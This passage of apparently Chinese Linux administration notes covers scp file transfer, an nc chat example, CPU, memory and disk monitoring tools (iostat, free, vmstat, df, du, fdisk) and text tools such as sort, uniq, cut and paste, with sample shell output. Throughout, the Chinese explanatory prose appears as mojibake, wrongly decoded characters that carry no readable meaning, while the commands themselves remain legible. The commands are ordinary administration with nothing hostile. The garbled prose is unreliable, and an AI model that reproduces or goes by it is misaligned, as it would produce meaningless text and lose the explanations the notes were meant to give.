Á¨¨1,2‰∏™ÊåáÂÆö‰∫ÜÁî®Êà∑ÂêçÔºåÂëΩ‰ª§ÊâßË°åÂêéÈúÄË¶ÅËæìÂÖ•Áî®Êà∑ÂØÜÁ†ÅÔºåÁ¨¨1‰∏™‰ªÖÊåáÂÆö‰∫ÜËøúÁ®ãÁöÑÁõÆÂΩïÔºåÊñá‰ª∂ÂêçÂ≠ó‰∏çÂèòÔºåÁ¨¨2‰∏™ÊåáÂÆö‰∫ÜÊñá‰ª∂Âêç 
Á¨¨3,4‰∏™Ê≤°ÊúâÊåáÂÆöÁî®Êà∑ÂêçÔºåÂëΩ‰ª§ÊâßË°åÂêéÈúÄË¶ÅËæìÂÖ•Áî®Êà∑ÂêçÂíåÂØÜÁ†ÅÔºåÁ¨¨3‰∏™‰ªÖÊåáÂÆö‰∫ÜËøúÁ®ãÁöÑÁõÆÂΩïÔºåÊñá‰ª∂ÂêçÂ≠ó‰∏çÂèòÔºåÁ¨¨4‰∏™ÊåáÂÆö‰∫ÜÊñá‰ª∂Âêç 

ÂÆû‰æãÔºö‰∏ä‰º†Êú¨Âú∞Êñá‰ª∂Âà∞ËøúÁ®ãÊú∫Âô®ÊåáÂÆöÁõÆÂΩï
scp /opt/soft/nginx-0.5.38.tar.gz root@10.80.100.20:/opt/soft/scptest
ËØ¥Êòé
‰∏ä‰º†Êú¨Âú∞opt/soft/ÁõÆÂΩï‰∏ãÁöÑÊñá‰ª∂nginx-0.5.38.tar.gz Âà∞ËøúÁ®ãÊú∫Âô®10.80.100.20ÁöÑopt/soft/scptestÁõÆÂΩï

(2) ‰∏ä‰º†ÁõÆÂΩï
ÂëΩ‰ª§Ê†ºÂºèÔºö 
scp -r local_folder remote_username@remote_ip:remote_folder 
ÊàñËÄÖ 
scp -r local_folder remote_ip:remote_folder 
Á¨¨1‰∏™ÊåáÂÆö‰∫ÜÁî®Êà∑ÂêçÔºåÂëΩ‰ª§ÊâßË°åÂêéÈúÄË¶ÅËæìÂÖ•Áî®Êà∑ÂØÜÁ†ÅÔºõ 
Á¨¨2‰∏™Ê≤°ÊúâÊåáÂÆöÁî®Êà∑ÂêçÔºåÂëΩ‰ª§ÊâßË°åÂêéÈúÄË¶ÅËæìÂÖ•Áî®Êà∑ÂêçÂíåÂØÜÁ†ÅÔºõ

ÂÆû‰æãÔºö‰∏ä‰º†Êú¨Âú∞ÁõÆÂΩïÂà∞ËøúÁ®ãÊú∫Âô®ÊåáÂÆöÁõÆÂΩï
scp -r /opt/soft/mongodb root@10.80.100.20:/opt/soft/scptest
ËØ¥Êòé
‰∏ä‰º†Êú¨Âú∞opt/soft/ÁõÆÂΩïÂà∞ËøúÁ®ãÊú∫Âô®10.80.100.20ÁöÑopt/soft/scptestÁõÆÂΩï
----



===== ‰ªéËøúÁ®ãÊúçÂä°Âô®‰∏ãËΩΩÂà∞Êú¨Âú∞ÊúçÂä°Âô®

----
‰ªéËøúÁ®ã‰∏ãËΩΩÂà∞Êú¨Âú∞ÁöÑscpÂëΩ‰ª§‰∏é‰∏äÈù¢ÁöÑÂëΩ‰ª§Èõ∑ÂêåÔºåÂè™Ë¶ÅÂ∞Ü‰ªéÊú¨Âú∞‰∏ä‰º†Âà∞ËøúÁ®ãÁöÑÂëΩ‰ª§ÂêéÈù¢2‰∏™ÂèÇÊï∞‰∫íÊç¢È°∫Â∫èÂ∞±Ë°å‰∫Ü„ÄÇ
ÂÆû‰æã1Ôºö‰ªéËøúÂ§Ñ‰∏ãËΩΩÊñá‰ª∂Âà∞Êú¨Âú∞ÁõÆÂΩï
scp root@10.80.100.20:/opt/soft/nginx-0.5.38.tar.gz /opt/soft/
ËØ¥Êòé
‰ªé10.80.100.20Êú∫Âô®‰∏äÁöÑ/opt/soft/ÁöÑÁõÆÂΩï‰∏≠‰∏ãËΩΩnginx-0.5.38.tar.gz Êñá‰ª∂Âà∞Êú¨Âú∞/opt/soft/ÁõÆÂΩï‰∏≠

ÂÆû‰æã2Ôºö‰ªéËøúÂ§Ñ‰∏ãËΩΩÁõÆÂΩïÂà∞Êú¨Âú∞ÁõÆÂΩï
scp -r root@10.80.100.20:/opt/soft/mongodb /opt/soft/
ËØ¥Êòé
‰ªé10.80.100.20Êú∫Âô®‰∏äÁöÑ/opt/soft/‰∏≠‰∏ãËΩΩmongodb ÁõÆÂΩïÂà∞Êú¨Âú∞ÁöÑ/opt/soft/ÁõÆÂΩïÊù•„ÄÇ
----

ÂèÇËÄÉÔºö
https://www.cnblogs.com/webnote/p/5877920.html

==== nc - Êï∞ÊçÆ‰º†Ëæì
ËÅäÂ§©
----
ÁúãÁúã8090Á´ØÂè£ÊòØÂê¶Âú®‰ΩøÁî®
[work@vm ~]$ lsof -i:8090

ÁõëÂê¨8090Á´ØÂè£
[work@vm ~]$ nc -l 8090
ffff
ggg
wo shi ni de

ËøûÊé•10.26.21.4Êú∫Âô®ÁöÑ8090Á´ØÂè£ÔºåÊ≥®ÊÑè
[skyler@skyler ~]$ nc 10.26.21.4 8090
ffff
ggg
wo shi ni de
----




== CPU„ÄÅÂÜÖÂ≠ò„ÄÅÁ°¨ÁõòÁöÑ‰ΩøÁî®Áä∂ÊÄÅ

=== cpu‰ΩøÁî®Áä∂ÊÄÅ

----
topÔºöËé∑Âèñ CPU ÂíåÁ°¨ÁõòÁöÑ‰ΩøÁî®Áä∂ÊÄÅÔºåÈÄöÂ∏∏‰ΩøÁî®‰ΩøÁî® topÔºàhtop Êõ¥‰Ω≥Ôºâ
iostatÔºöCPUÂà©Áî®ÊÉÖÂÜµÊä•Âëä
mpstatÔºöCPUÂÆûÊó∂ÁõëÊéßÂ∑•ÂÖ∑
----

==== 'iostat -c' CPUÂà©Áî®ÊÉÖÂÜµÊä•Âëä

----
iostat -c 1 10
avg-cpu: %user %nice %sys %iowait %idle
1.98 0.00 0.35 11.45 86.22
avg-cpu: %user %nice %sys %iowait %idle
1.62 0.00 0.25 34.46 63.67
----

==== mpstat- Multiprocessor Statistics

> ÂÆûÊó∂CPUÁõëÊéßÂ∑•ÂÖ∑

----

----



=== IO

----
iostat:ËÆæÂ§á„ÄÅÂàÜÁâáÁöÑËæìÂÖ•ËæìÂá∫ÁªüËÆ°Êï∞ÊçÆ
iotop:ÁõëËßÜÁ£ÅÁõòI/O‰ΩøÁî®Áä∂ÂÜµÂ∑•ÂÖ∑
----



==== iostat - Êä•ÂëäCPUÁªüËÆ°Êï∞ÊçÆÂíåËÆæÂ§á„ÄÅÂàÜÁâáÁöÑËæìÂÖ•ËæìÂá∫ÁªüËÆ°Êï∞ÊçÆ

----
iostat‰∏ªË¶ÅÁî®‰∫éÁõëÊéßÁ≥ªÁªüËÆæÂ§áÁöÑIOË¥üËΩΩÊÉÖÂÜµ
iostat -mxz 15 ÂèØ‰ª•ËÆ©‰Ω†Ëé∑ÊÇâ CPU ÂíåÊØè‰∏™Á°¨ÁõòÂàÜÂå∫ÁöÑÂü∫Êú¨‰ø°ÊÅØÂíåÊÄßËÉΩË°®Áé∞
----



==== iotop ‚Äì simple top-like I/O monitor

> iotopÊòØ‰∏Ä‰∏™Áî®Êù•ÁõëËßÜÁ£ÅÁõòI/O‰ΩøÁî®Áä∂ÂÜµÁöÑ top Á±ªÂ∑•ÂÖ∑ÔºåÂèØÁõëÊµãÂà∞Âì™‰∏Ä‰∏™Á®ãÂ∫è‰ΩøÁî®ÁöÑÁ£ÅÁõòIOÁöÑ‰ø°ÊÅØÔºàrequires 2.6.20 or laterÔºâ



=== ÂÜÖÂ≠ò‰ΩøÁî®Áä∂ÊÄÅ

----
freeÔºöÂ±ïÁ§∫ÂÜÖÂ≠òÁöÑÂ∑≤‰ΩøÁî®ÂíåÁ©∫Èó≤ÁöÑÊï∞ÈáèÊï∞ÊçÆ
vmstatÔºöÊä•ÂëäËôöÊãüÂÜÖÂ≠òÁªüËÆ°Êï∞ÊçÆ
/proc/meminfoÔºöÂåÖÂê´‰∫ÜÊõ¥Â§öÊõ¥ÂéüÂßãÁöÑ‰ø°ÊÅØÔºåÂè™ÊòØÁúãËµ∑Êù•‰∏çÂ§™Áõ¥ËßÇ
Âå∫Âà´Ôºöfree‰∏∫‰Ω†Êèê‰æõ‰∫ÜÊ¶ÇË¶Å‰ø°ÊÅØÔºåËæìÂá∫ÁªìÊûúÊ∏ÖÊô∞Ôºõ/proc/meminfoÊèê‰æõÊõ¥Â§öÊõ¥ÂéüÂßãÁöÑ‰ø°ÊÅØÔºåÊòØ‰∫ÜËß£LinuxÁ≥ªÁªüÂÜÖÂ≠ò‰ΩøÁî®Áä∂ÂÜµÁöÑ‰∏ªË¶ÅÊé•Âè£ÔºåÊàë‰ª¨ÊúÄÂ∏∏Áî®ÁöÑ‚Äùfree‚Äù„ÄÅ‚Äùvmstat‚ÄùÁ≠âÂëΩ‰ª§Â∞±ÊòØÈÄöËøáÂÆÉËé∑ÂèñÊï∞ÊçÆÁöÑ 
----



==== free - Display amount of free and used memory in the system

----
free
[root@aizbp11lqlgyf2g31fgsfhg ~]# free -h
              total        used        free      shared  buff/cache   available
Mem:           1.8G        1.1G         88M        668K        581M        501M
Swap:            0B          0B          0B

cat /proc/meminfo
[root@aizbp11lqlgyf2g31fgsfhg ~]# cat /proc/meminfo
MemTotal:        1883492 kB
MemFree:           91292 kB
MemAvailable:     513480 kB
Buffers:          105988 kB
Cached:           425896 kB
SwapCached:            0 kB
Active:          1398952 kB
Inactive:         287908 kB
Active(anon):    1155456 kB
Inactive(anon):      188 kB
Active(file):     243496 kB
Inactive(file):   287720 kB
Unevictable:           0 kB
Mlocked:               0 kB
----

==== vmstat - Report virtual memory statistics

----
vmstat: ÂÜÖÂ≠ò‰ΩøÁî®Áä∂ÊÄÅ
[root@aizbp11lqlgyf2g31fgsfhg ~]# vmstat
procs -----------memory---------- ---swap-- -----io---- -system-- ------cpu-----
 r  b   swpd   free   buff  cache   si   so    bi    bo   in   cs us sy id wa st
 4  0      0  91008 106004 489120    0    0     3    11    1    0  2  1 98  0  0
----

==== /proc/meminfo

----

----



=== Á°¨(Á£Å)Áõò‰ΩøÁî®Áä∂ÊÄÅ

----
dfÔºöÊ£ÄÊü•Êñá‰ª∂Á≥ªÁªüÁ£ÅÁõòÂç†Áî®ÊÉÖÂÜµ
duÔºöÊ£ÄÊü•Á£ÅÁõòÁ©∫Èó¥Âç†Áî®ÊÉÖÂÜµ,ËÆ°ÁÆóÊØè‰∏™Êñá‰ª∂ÁöÑÂ§ßÂ∞èÁÑ∂ÂêéÁ¥ØÂä†
ncduÔºöÊòØ‰∏Ä‰∏™ÂèØ‰ª•Êõø‰ª£duÂëΩ‰ª§ÁöÑÂ∑•ÂÖ∑
iostatÔºöÁ°¨ÁõòÁöÑËæìÂÖ•ËæìÂá∫‰ΩøÁî®Áä∂ÊÄÅ
fdiskÔºöÁ£ÅÁõòÂàÜÂå∫Ë°®Êï∞ÊçÆÔºåÂèØ‰ª•ÂàõÂª∫ÂíåÁª¥Êä§ÂàÜÂå∫Ë°®

du‰∏édfÁöÑÂå∫Âà´Ôºö
duÊòØÈÄöËøáÊêúÁ¥¢Êñá‰ª∂Êù•ËÆ°ÁÆóÊØè‰∏™Êñá‰ª∂ÁöÑÂ§ßÂ∞èÁÑ∂ÂêéÁ¥ØÂä†ÔºåduËÉΩÁúãÂà∞ÁöÑÊñá‰ª∂Âè™ÊòØ‰∏Ä‰∫õÂΩìÂâçÂ≠òÂú®ÁöÑÔºåÊ≤°ÊúâË¢´Âà†Èô§ÁöÑ„ÄÇ‰ªñËÆ°ÁÆóÁöÑÂ§ßÂ∞èÂ∞±ÊòØÂΩìÂâç‰ªñËÆ§‰∏∫Â≠òÂú®ÁöÑÊâÄÊúâÊñá‰ª∂Â§ßÂ∞èÁöÑÁ¥ØÂä†Âíå„ÄÇËÄådfÊòØÊ£ÄÊü•Êñá‰ª∂Á≥ªÁªüÁöÑÁ£ÅÁõòÁ©∫Èó¥‰ΩøÁî®ÊÉÖÂÜµ

du‰∏éncduÁöÑÂå∫Âà´Ôºö
ncduÊòØ‰∏Ä‰∏™ÂèØ‰ª•Êõø‰ª£duÂëΩ‰ª§ÁöÑÂ∑•ÂÖ∑ÔºåncduÂëΩ‰ª§ÊòØÂØπ‰º†ÁªüduÂëΩ‰ª§ÂäüËÉΩ‰∏äÁöÑÂ¢ûÂº∫.ÂÆÉÊØîÂØªÂ∏∏ÁöÑÂëΩ‰ª§ÔºåÂ¶Ç du -sh *ÔºåÊõ¥ËäÇÁúÅÊó∂Èó¥
----

==== df - disk free

----
df -h Êü•ÁúãÂêÑÂàÜÂå∫‰ΩøÁî®ÊÉÖÂÜµ 
[root@aizbp11lqlgyf2g31fgsfhg ~]# df -h
Êñá‰ª∂Á≥ªÁªü        ÂÆπÈáè  Â∑≤Áî®  ÂèØÁî® Â∑≤Áî®% ÊåÇËΩΩÁÇπ
/dev/vda1        40G   19G   19G   51% /
devtmpfs        911M     0  911M    0% /dev
tmpfs           920M     0  920M    0% /dev/shm
tmpfs           920M  668K  920M    1% /run
tmpfs           920M     0  920M    0% /sys/fs/cgroup
tmpfs           184M     0  184M    0% /run/user/0
overlay          40G   19G   19G   51% /var/lib/docker/overlay2/85bcc5f201ed0fbf82697f11da0730fbb8543b0e6cc9707b43b331e6e02d4eb0/merged
shm              64M     0   64M    0% /var/lib/docker/containers/10f26d49e94eb6042a25a7807f293a5b75abe75af571414c0ae6e878b0ccdf41/shm
----

==== du - disk usage

> Á°¨Áõò‰ΩøÁî®ÊÉÖÂÜµÊ¶ÇËø∞

----
Êü•ÁúãrootÁõÆÂΩï‰∏ãÁöÑÁõ¥Êé•Â±ÇÁ∫ßÊñá‰ª∂(Â§π)Â§ßÂ∞è
[root@aizbp11lqlgyf2g31fgsfhg ~]# du -sh *
52K	hs_err_pid24203.log
52K	hs_err_pid25726.log
52K	hs_err_pid27481.log
4.0K	log.stack
2.2G	skyler_home
4.0K	test2.sh
4.0K	test.sh
4.0K	wget-log
[root@aizbp11lqlgyf2g31fgsfhg ~]# pwd
/root

Êü•ÁúãrootÁõÆÂΩï‰∏ãÁöÑÊâÄÊúâÂ±ÇÁ∫ßÊñá‰ª∂(Â§π)Â§ßÂ∞è
[root@aizbp11lqlgyf2g31fgsfhg ~]# du -h *
Áï•
----

==== ncdu

----
aliyunÈªòËÆ§Ê≤°ÊúâËøô‰∏™ÂëΩ‰ª§
----

==== iostatÔºöÁ°¨ÁõòÁöÑËæìÂÖ•ËæìÂá∫‰ΩøÁî®Áä∂ÊÄÅ

----

----

==== fdiskÔºöÁ£ÅÁõòÂàÜÂå∫Ë°®Êï∞ÊçÆ

----
ÂàóÂá∫ÊâÄÊúâÁ£ÅÁõòÊï∞ÊçÆ
[root@aizbp11lqlgyf2g31fgsfhg ~]# fdisk  -l

Á£ÅÁõò /dev/vdaÔºö42.9 GB, 42949672960 Â≠óËäÇÔºå83886080 ‰∏™ÊâáÂå∫
Units = ÊâáÂå∫ of 1 * 512 = 512 bytes
ÊâáÂå∫Â§ßÂ∞è(ÈÄªËæë/Áâ©ÁêÜ)Ôºö512 Â≠óËäÇ / 512 Â≠óËäÇ
I/O Â§ßÂ∞è(ÊúÄÂ∞è/ÊúÄ‰Ω≥)Ôºö512 Â≠óËäÇ / 512 Â≠óËäÇ
Á£ÅÁõòÊ†áÁ≠æÁ±ªÂûãÔºödos
Á£ÅÁõòÊ†áËØÜÁ¨¶Ôºö0x0008d73a

   ËÆæÂ§á Boot      Start         End      Blocks   Id  System
/dev/vda1   *        2048    83884031    41940992   83  Linux

Êü•Áúã/dev/vda1Á£ÅÁõòÊï∞ÊçÆÔºåÂπ∂ÂèØ‰ª•‰øÆÊîπ
[root@aizbp11lqlgyf2g31fgsfhg ~]# fdisk /dev/vda1
Ê¨¢Ëøé‰ΩøÁî® fdisk (util-linux 2.23.2)„ÄÇ

Êõ¥ÊîπÂ∞ÜÂÅúÁïôÂú®ÂÜÖÂ≠ò‰∏≠ÔºåÁõ¥Âà∞ÊÇ®ÂÜ≥ÂÆöÂ∞ÜÊõ¥ÊîπÂÜôÂÖ•Á£ÅÁõò„ÄÇ
‰ΩøÁî®ÂÜôÂÖ•ÂëΩ‰ª§ÂâçËØ∑‰∏âÊÄù„ÄÇ

Device does not contain a recognized partition table
‰ΩøÁî®Á£ÅÁõòÊ†áËØÜÁ¨¶ 0xbc589282 ÂàõÂª∫Êñ∞ÁöÑ DOS Á£ÅÁõòÊ†áÁ≠æ„ÄÇ

ÂëΩ‰ª§(ËæìÂÖ• m Ëé∑ÂèñÂ∏ÆÂä©)Ôºöp

Á£ÅÁõò /dev/vda1Ôºö42.9 GB, 42947575808 Â≠óËäÇÔºå83881984 ‰∏™ÊâáÂå∫
Units = ÊâáÂå∫ of 1 * 512 = 512 bytes
ÊâáÂå∫Â§ßÂ∞è(ÈÄªËæë/Áâ©ÁêÜ)Ôºö512 Â≠óËäÇ / 512 Â≠óËäÇ
I/O Â§ßÂ∞è(ÊúÄÂ∞è/ÊúÄ‰Ω≥)Ôºö512 Â≠óËäÇ / 512 Â≠óËäÇ
Á£ÅÁõòÊ†áÁ≠æÁ±ªÂûãÔºödos
Á£ÅÁõòÊ†áËØÜÁ¨¶Ôºö0xbc589282

     ËÆæÂ§á Boot      Start         End      Blocks   Id  System

ÂëΩ‰ª§(ËæìÂÖ• m Ëé∑ÂèñÂ∏ÆÂä©)Ôºö
----



== ÊñáÊú¨Â§ÑÁêÜÁõ∏ÂÖ≥

=== ÊéíÂ∫è‰∏éËøáÊª§

==== sort ÊéíÂ∫è

----
sort
-t ÊåáÂÆöÂàÜÈöîÁ¨¶ÔºàÈÄöÂ∏∏‰∏é -k ËÅîÁî®Ôºâ
-k ÊåáÂÆöÁî®‰∫éÊéíÂ∫èÁöÑÂàóÂè∑
-n ‰ª•Êï∞Â≠óËøõË°åÊéíÂ∫è

ÂÆû‰æãÔºö
[root@aizbp11lqlgyf2g31fgsfhg ~]# cat test.sh
echo $# $0 $1
aaa=111
echoaaa=1
echo aaa=31
fff=3
bbbf=50
aaa=111

[root@aizbp11lqlgyf2g31fgsfhg ~]# sort -n -t = -k 2 test.sh
echo $# $0 $1
echoaaa=1
fff=3
echo aaa=31
bbbf=50
aaa=111
aaa=111
----

ÂèØ‰ª•ÁúãÂà∞ÊñáÊú¨ÊåâÊï∞Â≠óÂ§ßÂ∞èÊéíÂ∫èËæìÂá∫„ÄÇÊúÄÂêé‰∏§Ë°åÊòØÈáçÂ§çÁöÑÔºåËøáÊª§ÈáçÂ§çÊàë‰ª¨Â∞±ÈúÄË¶Å`uniq`ÂëΩ‰ª§‰∫Ü

==== uniq ËøáÊª§

----
ÂæÄÂæÄ‰∏ésort‰∏ÄËµ∑‰ΩøÁî®Ôºå‰ªéÂêçÂ≠óÂèØ‰ª•ÁúãÂá∫Êù•ÔºåÂèñÂîØ‰∏ÄÁöÑÊÑèÊÄù
Ëß£ÂÜ≥‰∏äÊñásort -n -t = -k 2 test.shÈáçÂ§çÊï∞ÊçÆÁöÑÈóÆÈ¢òÔºåÊàë‰ª¨Âè™ÈúÄË¶ÅËøôÊ†∑ÂÅö
[root@aizbp11lqlgyf2g31fgsfhg ~]# sort -t = -k 2 -n test.sh |uniq
echo $# $0 $1
echoaaa=1
fff=3
echo aaa=31
bbbf=50
aaa=111
----

=== Êà™Âèñ‰∏éËøûÊé•

==== cut ÊåâÂàóÂàáÂàÜÊñáÊú¨

----
-b ‰ª•Â≠óËäÇ‰∏∫Âçï‰ΩçËøõË°åÂàÜÂâ≤
-c ‰ª•Â≠óÁ¨¶‰∏∫Âçï‰ΩçËøõË°åÂàÜÂâ≤
-f ‰ª•Â≠óÊÆµ‰∏∫ÂàÜÈöîÂçï‰ΩçÔºå‰∏é-d‰∏ÄËµ∑‰ΩøÁî®ÔºåÊåáÂÆöÊòæÁ§∫Âì™‰∏™Âå∫Âüü
-d ÊåáÂÆöÂàÜÈöîÁ¨¶ÔºåÈªòËÆ§Âà∂Ë°®Á¨¶

ÂÆû‰æãÔºöËé∑Âèñtest-project-webÊúçÂä°ÈÖçÁΩÆ‰∏≠Á¨¨18Âàó=Âè≥‰æßÁöÑ‰ø°ÊÅØ
ÂÖ®ÈÉ®‰ø°ÊÅØ‰∏∫Ôºö
[skyler@tt ~]$ ps -ef|grep test-project-web
skyler     11021     1  3 10Êúà09 ?      06:41:36 /usr/local/bin/java -server -Xmn1024m -Xms4096m -Xmx4096m -XX:PermSize=64M -XX:MaxPermSize=128M -XX:+PrintGCDetails -XX:+PrintGCDateStamps -Xloggc:/home/skyler/var/test-project/log/gc.log -Dlogging.path=/home/skyler/var/test-project/log -Dlogging.config.path=/data0/skyler/test-project/test-project/config/cp/ -Dlogging.config=/data0/skyler/test-project/test-project/config/cp/base-logback.xml -jar /data0/skyler/test-project/test-project/lib/test-project-web-1.1.0.jar --spring.profiles.active=dev --spring.config.location=classpath:/,/data0/skyler/test-project/test-project/system/ --spring.config.name=application

[skyler@tt ~]$ ps -ef|grep test-project-web|awk '{print $18}'|cut -d = -f 2
/home/skyler/var/test-project/log
----



==== paste ÊåâÂàóÊãºÊé•ÊñáÊú¨

----
ÂèØ‰ª•Â∞Ü‰∏§‰∏™Êñá‰ª∂ÁöÑÂÜÖÂÆπÊãºÊé•Âú®‰∏ÄËµ∑
ÂÆû‰æãÔºöÂ∞Ütest.sh‰∏étest2.shÊãºÊé•Âú®‰∏ÄËµ∑
[root@aizbp11lqlgyf2g31fgsfhg ~]# echo "aa2" > test2.sh

[root@aizbp11lqlgyf2g31fgsfhg ~]# cat test.sh
echo $# $0 $1
aaa=111
echoaaa=1
echo aaa=31
fff=3
bbbf=50
aaa=111

[root@aizbp11lqlgyf2g31fgsfhg ~]# paste test.sh test2.sh
echo $# $0 $1	aa2
aaa=111
echoaaa=1
echo aaa=31
fff=3
bbbf=50
aaa=111

-d ÊåâÊåáÂÆöÂàÜÈöîÁ¨¶ÊãºÊé•
[root@aizbp11lqlgyf2g31fgsfhg ~]# paste test.sh test2.sh -d ','
echo $# $0 $1,aa2
aaa=111,
echoaaa=1,
echo aaa=31,
fff=3,
bbbf=50,
aaa=111,

----



=== Ë°åÂàóÊìç‰Ωú - ÈáçÁÇπ

==== awk - ÂàóÊìç‰Ωú

----
awk Âíå sed
----

==== sed - Êìç‰Ωú

----

----





== Êñá‰ª∂Â§ÑÁêÜÁõ∏ÂÖ≥

=== Êñá‰ª∂ÂÜÖÂÆπÊØîËæÉ

==== diff

----
diff file1 file2 -y

‰ΩøÁî® diff -r tree1 tree2 | diffstat Êü•ÁúãÂèòÊõ¥ÁöÑÁªüËÆ°Êï∞ÊçÆ
----

==== vimdiff - edit two, three or four versions of a file with Vim and show differences

----
vimdiff Áî®‰∫éÊØîÂØπÂπ∂ÁºñËæëÊñá‰ª∂
----





== ÊúçÂä°Á®ãÂ∫è

=== ÂéãÊµã

----
ab Â∑•ÂÖ∑ÔºàApache ‰∏≠Ëá™Â∏¶ÔºâÂèØ‰ª•ÁÆÄÂçïÁ≤óÊö¥Âú∞Ê£ÄÊü• web ÊúçÂä°Âô®ÁöÑÊÄßËÉΩ„ÄÇÂØπ‰∫éÊõ¥Â§çÊùÇÁöÑË¥üËΩΩÊµãËØïÔºå‰ΩøÁî® siege
----

=== java

Jps

=== Á®ãÂ∫èËØïÈîôÊ£ÄÊü•

----
‰∫ÜËß£ strace Âíå ltrace„ÄÇËøô‰ø©Â∑•ÂÖ∑Âú®‰Ω†ÁöÑÁ®ãÂ∫èËøêË°åÂ§±Ë¥•„ÄÅÊåÇËµ∑ÁîöËá≥Â¥©Ê∫ÉÔºåËÄå‰Ω†Âç¥‰∏çÁü•ÈÅì‰∏∫‰ªÄ‰πàÊàñ‰Ω†ÊÉ≥ÂØπÊÄßËÉΩÊúâ‰∏™ÊÄª‰ΩìÁöÑËÆ§ËØÜÁöÑÊó∂ÂÄôÊòØÈùûÂ∏∏ÊúâÁî®ÁöÑ„ÄÇÊ≥®ÊÑè profile ÂèÇÊï∞Ôºà-cÔºâÂíåÈôÑÂä†Âà∞‰∏Ä‰∏™ËøêË°åÁöÑËøõÁ®ãÂèÇÊï∞ Ôºà-pÔºâ

straceÔºöË∞ÉËØïÁ≥ªÁªüË∞ÉÁî®
strace ÁªèÂ∏∏Ë¢´ËÆ§‰∏∫ÊòØÁ®ãÂ∫èÂëòÁöÑË∞ÉËØïÂ∑•ÂÖ∑Ôºå‰ΩÜÂÆÉÁöÑÂäüÁî®‰∏ç‰ªÖ‰ªÖÁî®Êù•Ë∞ÉËØï„ÄÇÂÆÉÂèØ‰ª•Êà™Ëé∑ÂíåËÆ∞ÂΩïËøõÁ®ãË∞ÉÁî®Á≥ªÁªüÁöÑÊÉÖÂÜµ„ÄÇÂõ†ËÄåÔºåÂÆÉÊòØ‰∏Ä‰∏™ÂÆûÁî®ÁöÑËØäÊñ≠„ÄÅÊïôÂ≠¶ÂíåË∞ÉËØïÂ∑•ÂÖ∑„ÄÇÊØîÂ¶ÇËØ¥Ôºå‰Ω†ÂèØ‰ª•‰ΩøÁî®straceÊù•Êü•Âá∫Êüê‰∏™Á®ãÂ∫èÂú®ÂêØÂä®Êó∂ÂÆûÈôÖ‰∏ä‰ΩøÁî®Âì™‰∏™ÈÖçÁΩÆÊñá‰ª∂„ÄÇ

‰∏çËøástraceÁöÑÁ°ÆÊúâ‰∏Ä‰∏™Áº∫Èô∑„ÄÇÂÆÉÂú®Ê£ÄÊü•Êüê‰∏™ËøõÁ®ãÊó∂ÔºåËØ•ËøõÁ®ãÁöÑÊÄßËÉΩ‰ºö‰∏ÄËêΩÂçÉ‰∏à„ÄÇÂõ†ËÄåÔºåÂè™ÊúâÂú®ÊàëÂ∑≤ÁªèÊúâÊûÅÂÖ∂ÂÖÖÂàÜÁöÑÁêÜÁî±ËÆ§‰∏∫Êüê‰∏™Á®ãÂ∫èÂºïËµ∑ÈóÆÈ¢òÁöÑÊÉÖÂÜµ‰∏ãÔºåÊâç‰ΩøÁî®strace
----



== Â∏∏Áî®ÂëΩ‰ª§

----
Ëé∑Âèñjava_server_nameÁöÑÁ¨¨18ÂàóÂÄºÔºåÁ≠âÂè∑ÂàÜÈöî„ÄÇÂ∞§ÂÖ∂ÈÄÇÂêàjava -jarÂ§ö‰∏™ÂèÇÊï∞ÁöÑÂú∫ÊôØ
ps -ef|grep java_server_name|awk '{print $18}'|cut -d = -f 2

----